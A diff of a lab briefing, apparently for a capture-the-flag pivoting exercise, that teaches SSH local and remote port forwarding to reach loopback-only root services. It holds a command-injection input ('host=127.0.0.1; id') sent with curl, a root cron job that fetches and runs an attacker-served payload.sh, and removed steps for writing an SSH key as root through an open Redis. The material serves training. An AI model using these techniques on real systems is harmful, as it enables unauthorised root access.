@@ -12,22 +12,20 @@ the shell you're standing on — it's a SERVICE this box runs only on
 
   ss -tlnp    (or: netstat -tlnp)
 
-There's something on 127.0.0.1:6379. That's Redis — and this one has
-no password and is running as ROOT. Loopback-only is not a wall; it's
-a speed bump you drive over with an SSH tunnel.
-
 There are TWO loopback services here, and they teach the two
-forwarding directions:
+forwarding directions. Both end in code execution AS ROOT:
 
-  A (LOCAL forward, -L)  Pull the target's Redis to your box:
-       ssh -L 6379:127.0.0.1:6379 labuser1@target-pivot
-     Now attacker:6379 IS target's 127.0.0.1:6379. A root Redis can
-     CONFIG SET its save path, then SAVE — writing any file as root.
-     Drop your SSH key into /root/.ssh/authorized_keys, ssh in.
+  A (LOCAL forward, -L)  An internal "diagnostics" web app on
+     127.0.0.1:8080, running as root, with a classic command-
+     injection bug in /ping?host=. Pull it to your box:
+       ssh -L 8080:127.0.0.1:8080 labuser1@target-pivot
+     Then: curl -G 'http://127.0.0.1:8080/ping' \
+             --data-urlencode 'host=127.0.0.1; id'
+     The ';' starts a second command — and it runs as root.
 
-  B (REMOTE forward, -R)  There's also a root "updater" that runs
-     every minute and fetches http://127.0.0.1:9000/payload.sh. Nothing
-     listens there... until YOU publish your own web server onto the
+  B (REMOTE forward, -R)  A root "updater" runs every minute and
+     fetches http://127.0.0.1:9000/payload.sh. Nothing listens
+     there... until YOU publish your own web server onto the
      target's loopback:
        ssh -R 9000:127.0.0.1:8000 labuser1@target-pivot
      Serve a payload.sh on your box at :8000 and root runs it.
@@ -37,8 +35,9 @@ OBJECTIVE
   - Capture the flag:  /root/flag.txt   (only root can read it)
 
 FIRST MOVE
-  ss -tlnp                      (find the loopback listeners)
-  cat /etc/cron.d/rtr-updater   (see what the updater fetches)
+  ss -tlnp                              (find the loopback listeners)
+  curl http://127.0.0.1:8080/          (after the -L tunnel is up)
+  cat /etc/cron.d/rtr-updater           (see what the updater fetches)
 
 The real debrief — plus dynamic (-D/SOCKS) forwarding and chisel —
 is in targets/pivot/WRITEUP.md after you've had a go.
